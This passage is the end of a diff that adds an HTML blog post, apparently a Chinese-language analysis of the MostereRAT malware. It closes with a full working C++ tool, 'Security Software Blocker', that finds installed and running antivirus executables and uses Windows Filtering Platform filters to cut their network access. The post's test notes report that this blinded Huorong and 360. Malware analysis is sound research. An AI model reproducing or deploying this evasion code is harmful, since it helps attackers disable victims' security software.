+            std::wcerr &lt;&lt; <span class="hljs-string">L"FwpmFilterAdd0 failed. Error: "</span> &lt;&lt; result &lt;&lt; std::endl;
+            <span class="hljs-keyword">continue</span>;
+        }
+
+        EXPLICIT_ACCESS_W access = { <span class="hljs-number">0</span> };
+        access.grfAccessPermissions = GENERIC_ALL;
+        access.grfAccessMode = SET_ACCESS;
+        access.grfInheritance = NO_INHERITANCE;
+
+        TRUSTEE_W trustee = {};
+        <span class="hljs-built_in">BuildTrusteeWithNameW</span>(&amp;trustee, <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">wchar_t</span>*&gt;(<span class="hljs-string">L"SYSTEM"</span>));
+        access.Trustee = trustee;
+
+        PACL pAcl = <span class="hljs-literal">nullptr</span>;
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">SetEntriesInAclW</span>(<span class="hljs-number">1</span>, &amp;access, <span class="hljs-literal">nullptr</span>, &amp;pAcl) == ERROR_SUCCESS) {
+            result = <span class="hljs-built_in">FwpmFilterSetSecurityInfoByKey0</span>(g_engineHandle, &amp;filter.filterKey, DACL_SECURITY_INFORMATION, <span class="hljs-literal">nullptr</span>, <span class="hljs-literal">nullptr</span>, pAcl, <span class="hljs-literal">nullptr</span>);
+            <span class="hljs-keyword">if</span> (result != ERROR_SUCCESS) {
+                std::wcerr &lt;&lt; <span class="hljs-string">L"FwpmFilterSetSecurityInfoByKey0 failed. Error: "</span> &lt;&lt; result &lt;&lt; std::endl;
+            }
+            <span class="hljs-built_in">LocalFree</span>(pAcl);
+        }
+    }
+
+    g_blockedExecutables.<span class="hljs-built_in">insert</span>(applicationPath);
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+}
+
+<span class="hljs-function">std::set&lt;std::wstring&gt; <span class="hljs-title">ScanSecuritySoftwarePaths</span><span class="hljs-params">()</span> </span>{
+    std::set&lt;std::wstring&gt; foundExecutables;
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; basePathStr : securitySoftwarePaths) {
+        <span class="hljs-keyword">try</span> {
+            <span class="hljs-function">fs::path <span class="hljs-title">basePath</span><span class="hljs-params">(basePathStr)</span></span>;
+            <span class="hljs-keyword">if</span> (fs::<span class="hljs-built_in">exists</span>(basePath) &amp;&amp; fs::<span class="hljs-built_in">is_directory</span>(basePath)) {
+                <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; entry : fs::<span class="hljs-built_in">recursive_directory_iterator</span>(basePath, fs::directory_options::skip_permission_denied)) {
+                    <span class="hljs-keyword">if</span> (entry.<span class="hljs-built_in">is_regular_file</span>() &amp;&amp; entry.<span class="hljs-built_in">path</span>().<span class="hljs-built_in">extension</span>() == <span class="hljs-string">L".exe"</span>) {
+                        foundExecutables.<span class="hljs-built_in">insert</span>(fs::<span class="hljs-built_in">absolute</span>(entry.<span class="hljs-built_in">path</span>()).<span class="hljs-built_in">wstring</span>());
+                    }
+                }
+            }
+        }
+        <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> fs::filesystem_error&amp;) {
+        }
+    }
+    <span class="hljs-keyword">return</span> foundExecutables;
+}
+
+<span class="hljs-function">std::set&lt;std::wstring&gt; <span class="hljs-title">ScanRunningSecurityProcesses</span><span class="hljs-params">()</span> </span>{
+    std::set&lt;std::wstring&gt; foundProcesses;
+    HANDLE hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> foundProcesses;
+
+    PROCESSENTRY32W pe32 = { <span class="hljs-number">0</span> };
+    pe<span class="hljs-number">32.</span>dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32W);
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Process32FirstW</span>(hSnapshot, &amp;pe32)) {
+        <span class="hljs-keyword">do</span> {
+            <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; procName : securityProcessNames) {
+                <span class="hljs-keyword">if</span> (_wcsicmp(pe<span class="hljs-number">32.</span>szExeFile, procName.<span class="hljs-built_in">c_str</span>()) == <span class="hljs-number">0</span>) {
+                    std::wstring path = <span class="hljs-built_in">GetProcessPath</span>(pe<span class="hljs-number">32.</span>th32ProcessID);
+                    <span class="hljs-keyword">if</span> (!path.<span class="hljs-built_in">empty</span>()) {
+                        foundProcesses.<span class="hljs-built_in">insert</span>(path);
+                    }
+                }
+            }
+        } <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32NextW</span>(hSnapshot, &amp;pe32));
+    }
+    <span class="hljs-built_in">CloseHandle</span>(hSnapshot);
+    <span class="hljs-keyword">return</span> foundProcesses;
+}
+
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DetectAndBlockSecuritySoftware</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">auto</span> pathFound = <span class="hljs-built_in">ScanSecuritySoftwarePaths</span>();
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; path : pathFound) {
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">AddApplicationFirewallBlockRules</span>(path)) {
+            std::wcout &lt;&lt; <span class="hljs-string">L"Blocked (from Path Scan): "</span> &lt;&lt; path &lt;&lt; std::endl;
+        }
+    }
+
+    <span class="hljs-keyword">auto</span> procFound = <span class="hljs-built_in">ScanRunningSecurityProcesses</span>();
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; path : procFound) {
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">AddApplicationFirewallBlockRules</span>(path)) {
+            std::wcout &lt;&lt; <span class="hljs-string">L"Blocked (from Process Scan): "</span> &lt;&lt; path &lt;&lt; std::endl;
+        }
+    }
+}
+
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Cleanup</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">if</span> (g_engineHandle) {
+        <span class="hljs-built_in">FwpmEngineClose0</span>(g_engineHandle);
+        g_engineHandle = <span class="hljs-literal">nullptr</span>;
+    }
+}
+
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-built_in">atexit</span>(Cleanup);
+
+    std::wcout &lt;&lt; <span class="hljs-string">L"Security Software Blocker Started."</span> &lt;&lt; std::endl;
+    std::wcout &lt;&lt; <span class="hljs-string">L"Scanning periodically. Press Ctrl+C to exit."</span> &lt;&lt; std::endl;
+
+    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
+        <span class="hljs-built_in">DetectAndBlockSecuritySoftware</span>();
+        std::wcout &lt;&lt; <span class="hljs-string">L"\nScan complete. Waiting 10 seconds before next scan...\n"</span> &lt;&lt; std::endl;
+        <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">10000</span>); 
+    }
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre><p>测试效果:</p>
+<p><img src="/assets/posts/mostererat/images/1763546952045-217f413e-1100-4e71-9294-5d2d5d7bb061.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>火绒:网络访问错误</p>
+<p><img src="/assets/posts/mostererat/images/1763547087225-bae35e3e-7588-44f0-afa1-9d381399bb0d.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>360:一直处于检查中</p>
+</div><footer class="article-footer"><div><span>本文链接</span><a href="https://ycr0w.github.io/2026/08/13/mostererat/">https://ycr0w.github.io/2026/08/13/mostererat/</a></div></footer></article>
+    <aside class="article-aside"><div class="toc"><span>目录</span><a class="toc-level-2" href="#document.exe">document.exe</a><a class="toc-level-2" href="#%E7%AE%80%E6%98%93%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80">简易编程语言</a><a class="toc-level-3" href="#ruby.exe">ruby.exe</a><a class="toc-level-3" href="#svchost.exe">svchost.exe</a><a class="toc-level-3" href="#krnln.fnr">krnln.fnr</a><a class="toc-level-3" href="#maindll.db">maindll.db</a><a class="toc-level-3" href="#elsedll.db">elsedll.db</a><a class="toc-level-3" href="#%E6%B5%81%E9%87%8F%E9%98%BB%E6%96%AD%E5%AE%9E%E7%8E%B0">流量阻断实现</a></div></aside>
+    <nav class="post-navigation"><a href="/2026/08/13/lamehug/"><i data-lucide="arrow-left" aria-hidden="true"></i><span><small>上一篇</small>LAMEHUG</span></a><a href="/2026/08/13/powershell-exploits/"><span><small>下一篇</small>PowerShell Exploits</span><i data-lucide="arrow-right" aria-hidden="true"></i></a></nav>
+  </main>
+  <footer class="site-footer"><span>© 2026 YCr0w</span></footer>
+</body>
+</html>
